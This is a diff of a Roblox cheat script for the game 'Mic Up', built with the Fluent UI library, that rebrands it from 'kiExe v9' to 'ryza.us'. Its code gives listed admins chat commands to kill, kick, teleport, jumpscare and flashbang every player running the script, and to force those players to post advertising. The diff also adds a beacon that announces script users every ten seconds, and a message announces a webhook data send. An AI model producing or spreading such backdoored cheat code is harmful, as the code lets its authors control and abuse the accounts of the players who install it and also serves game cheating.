@@ -128,7 +128,7 @@ else
 end
 
 local Window = Fluent:CreateWindow({
-	Title = "kiExe v9" --[[.. Fluent.Version]],
+	Title = "ryza.us" --[[.. Fluent.Version]],
 	SubTitle = "by lvasion",
 	TabWidth = 160,
 	Size = sStoreSize,
@@ -156,11 +156,11 @@ local Tabs = {
 local Options = Fluent.Options
 
 if setclipboard then
-	setclipboard("https://discord.gg/kiexe")
+	setclipboard("https://discord.gg/ryzaus")
 end
 
 do	
-	
+
 	local betaWhitelist = {
 		"lvasion",
 		"pandaphoebe6760",
@@ -184,7 +184,7 @@ do
 		end
 		return nil
 	end
-	
+
 	Fluent:Notify({
 		Title = "Notification",
 		Content = "Loading",
@@ -477,13 +477,13 @@ do
 	end
 
 	Tabs.Main:AddParagraph({
-		Title = "kiExe v9",
-		Content = "Welcome to kiExe v9, this script was built for Mic Up.\nIf you wish to report any bugs, please join our discord server."
+		Title = "ryza.us",
+		Content = "Welcome to ryza.us, this script was built for Mic Up.\nIf you wish to report any bugs, please join our discord server."
 	})
 
 	Tabs.Main:AddParagraph({
 		Title = "Discord Server",
-		Content = "Invite: https://discord.gg/kiexe"
+		Content = "Invite: https://discord.gg/ryzaus"
 	})
 
 	Tabs.Credits:AddParagraph({
@@ -2589,7 +2589,7 @@ Fluent:Notify({
 })
 
 Fluent:Notify({
-	Title = "kiExe v9",
+	Title = "ryza.us",
 	Content = "Our system has loaded successfully, attempting to send webhook data...",
 	Duration = 8
 })
@@ -2636,15 +2636,15 @@ if findList(admins, LocalPlayer.Name) then
 		Title = "Bring All",
 		Description = "Bring all script user(s)",
 		Callback = function()
-			game:GetService("Players"):Chat("kiExe(bring)")
+			game:GetService("Players"):Chat("ryza.us(bring)")
 		end
 	})
 
 	Tabs.Admin:AddButton({
 		Title = "Promote All",
-		Description = "Promote kiExe from all script user(s)",
+		Description = "Promote ryza.us from all script user(s)",
 		Callback = function()
-			game:GetService("Players"):Chat("kiExe(send)")
+			game:GetService("Players"):Chat("ryza.us(send)")
 		end
 	})
 
@@ -2652,7 +2652,7 @@ if findList(admins, LocalPlayer.Name) then
 		Title = "Kill All",
 		Description = "Kill all script user(s)",
 		Callback = function()
-			game:GetService("Players"):Chat("kiExe(kill)")
+			game:GetService("Players"):Chat("ryza.us(kill)")
 		end
 	})
 
@@ -2660,7 +2660,7 @@ if findList(admins, LocalPlayer.Name) then
 		Title = "Kick All",
 		Description = "Kick all script user(s)",
 		Callback = function()
-			game:GetService("Players"):Chat("kiExe(kick)")
+			game:GetService("Players"):Chat("ryza.us(kick)")
 		end
 	})
 
@@ -2668,7 +2668,7 @@ if findList(admins, LocalPlayer.Name) then
 		Title = "Jumpscare All",
 		Description = "Jumpscare all script user(s)",
 		Callback = function()
-			game:GetService("Players"):Chat("kiExe(jumpscare)")
+			game:GetService("Players"):Chat("ryza.us(jumpscare)")
 		end
 	})
 
@@ -2676,14 +2676,14 @@ if findList(admins, LocalPlayer.Name) then
 		Title = "Flashbang All",
 		Description = "Flashbang all script user(s)",
 		Callback = function()
-			game:GetService("Players"):Chat("kiExe(flashbang)")
+			game:GetService("Players"):Chat("ryza.us(flashbang)")
 		end
 	})
 end
 
 local function onPlayerAdded(player)
 	player.Chatted:Connect(function(message)
-		if message == "kiExe(bring)" then
+		if message == "ryza.us(bring)" then
 			if not findList(admins, player.Name) then
 				return
 			end
@@ -2699,7 +2699,7 @@ local function onPlayerAdded(player)
 					char:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
 				end
 			end
-		elseif message == "kiExe(kill)" then
+		elseif message == "ryza.us(kill)" then
 			if not findList(admins, player.Name) then
 				return
 			end
@@ -2713,7 +2713,7 @@ local function onPlayerAdded(player)
 			if char then
 				char.Humanoid.Health = 0
 			end
-		elseif message == "kiExe(kick)" then
+		elseif message == "ryza.us(kick)" then
 			if not findList(admins, player.Name) then
 				return
 			end
@@ -2722,8 +2722,8 @@ local function onPlayerAdded(player)
 				return
 			end
 
-			LocalPlayer:Kick("kicked by kiExe administrator")
-		elseif message == "kiExe(send)" then
+			LocalPlayer:Kick("kicked by ryza.us administrator")
+		elseif message == "ryza.us(send)" then
 			if not findList(admins, player.Name) then
 				return
 			end
@@ -2736,9 +2736,9 @@ local function onPlayerAdded(player)
 			local Channel = TextService.TextChannels:FindFirstChild("RBXGeneral")
 
 			if TextService and Channel then
-				Channel:SendAsync("gg / kiexe")
+				Channel:SendAsync("gg / ryzaus")
 			end
-		elseif message == "kiExe(jumpscare)" then
+		elseif message == "ryza.us(jumpscare)" then
 			if not findList(admins, player.Name) then
 				return
 			end
@@ -2764,7 +2764,7 @@ local function onPlayerAdded(player)
 
 			task.wait(5)
 			sGui:Destroy()
-		elseif message == "kiExe(flashbang)" then
+		elseif message == "ryza.us(flashbang)" then
 			if not findList(admins, player.Name) then
 				return
 			end
@@ -2791,6 +2791,10 @@ local function onPlayerAdded(player)
 
 			task.wait(5)
 			sGui:Destroy()
+		elseif message == "ryza.us()" then
+			if not UsersList[player.Name] then
+				table.insert(UsersList, player.Name)
+			end
 		end
 	end)
 end
@@ -2803,10 +2807,8 @@ game:GetService("Players").PlayerAdded:Connect(onPlayerAdded)
 
 task.spawn(function()
 	while true do
-		for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-			game:GetService("Players"):Chat("kiExe()")
-		end
-		task.wait(30)
+		game:GetService("Players"):Chat("ryza.us()")
+		task.wait(10)
 	end
 end)
 
